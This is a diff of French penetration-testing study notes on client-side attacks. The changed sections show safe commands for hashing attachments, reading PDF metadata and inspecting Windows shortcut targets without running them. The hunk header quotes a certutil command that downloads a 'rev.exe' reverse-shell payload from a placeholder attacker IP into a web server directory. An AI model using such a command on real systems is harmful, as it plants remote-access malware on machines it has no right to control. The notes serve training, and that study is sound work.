@@ -567,51 +567,55 @@ cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe 
 
 ```
 
-#### Empreinte d'une pièce jointe
+## Examiner une pièce jointe
 
-Conserver une empreinte SHA-256 des fichiers étudiés afin de comparer les résultats sans diffuser les originaux.
-
-<p class="oscp-command-note">Empreinte d'une pièce jointe.</p>
+### Calculer son empreinte dans PowerShell
 
 ```powershell
-Get-FileHash -Algorithm SHA256 -Path '<DOCUMENT>'
+Get-FileHash -LiteralPath '.\document.pdf' -Algorithm SHA256
 ```
 
-### Contrôler les métadonnées d'une pièce jointe
-
-Examiner les métadonnées d'un document et les informations d'un fichier PDF avant son ouverture.
-
-<p class="oscp-command-note">Contrôler les métadonnées d'une pièce jointe.</p>
+### Lire ses métadonnées avec ExifTool
 
 ```bash
-exiftool <FICHIER_A_ANALYSER>
-pdfinfo <DOCUMENT>.pdf
+exiftool ./document.pdf
+```
+
+### Lire les propriétés du PDF avec Poppler
+
+```bash
+pdfinfo ./document.pdf
 ```
 
 ## Examiner les raccourcis Windows
 
-Les raccourcis .lnk peuvent contenir un chemin cible, des arguments et un répertoire de travail. Les examiner avant exécution pour comprendre le comportement demandé à l'utilisateur.
+### Lister les raccourcis du Bureau
 
-### Inventorier les raccourcis du Bureau
-
-Recenser les fichiers .lnk accessibles par le compte courant.
-
-<p class="oscp-command-note">Inventorier les raccourcis du Bureau.</p>
+PowerShell interroge le dossier Bureau du profil, y compris lorsqu’il a été redirigé.
 
 ```powershell
-Get-ChildItem "$env:USERPROFILE\Desktop" -Filter '*.lnk' -File -ErrorAction SilentlyContinue
+$bureau = [Environment]::GetFolderPath('DesktopDirectory')
+Get-ChildItem -LiteralPath $bureau -Filter '*.lnk' -File
 ```
 
-### Lire la cible et les arguments
+### Lire la cible et les arguments des raccourcis
 
-Interroger les métadonnées de chaque raccourci via l'interface COM de Windows, sans l'exécuter.
-
-<p class="oscp-command-note">Lire la cible et les arguments.</p>
+Sur Windows, l’interface COM `WScript.Shell` lit les raccourcis du Bureau sans lancer leur cible.
 
 ```powershell
-$Shell = New-Object -ComObject WScript.Shell
-Get-ChildItem "$env:USERPROFILE\Desktop" -Filter '*.lnk' -File | ForEach-Object { $Lnk = $Shell.CreateShortcut($_.FullName); [PSCustomObject]@{Nom=$_.Name; Cible=$Lnk.TargetPath; Arguments=$Lnk.Arguments} }
+$bureau = [Environment]::GetFolderPath('DesktopDirectory')
+$shell = New-Object -ComObject WScript.Shell
+Get-ChildItem -LiteralPath $bureau -Filter '*.lnk' -File | ForEach-Object {
+    $raccourci = $shell.CreateShortcut($_.FullName)
+    [PSCustomObject]@{
+        Nom = $_.Name
+        Cible = $raccourci.TargetPath
+        Arguments = $raccourci.Arguments
+    }
+}
 ```
+
+[Get-FileHash](https://learn.microsoft.com/powershell/module/microsoft.powershell.utility/get-filehash) · [ExifTool](https://exiftool.org/exiftool_pod.html) · [pdfinfo](https://manpages.debian.org/trixie/poppler-utils/pdfinfo.1.en.html) · [Dossiers spéciaux .NET](https://learn.microsoft.com/dotnet/api/system.environment.getfolderpath).
 
 **Référence complémentaire :** [krovs/oscp-notes](https://github.com/krovs/oscp-notes/blob/main/docs/12_client-side_attacks.md). Explications rédigées pour SKILL-ISSUE.
 
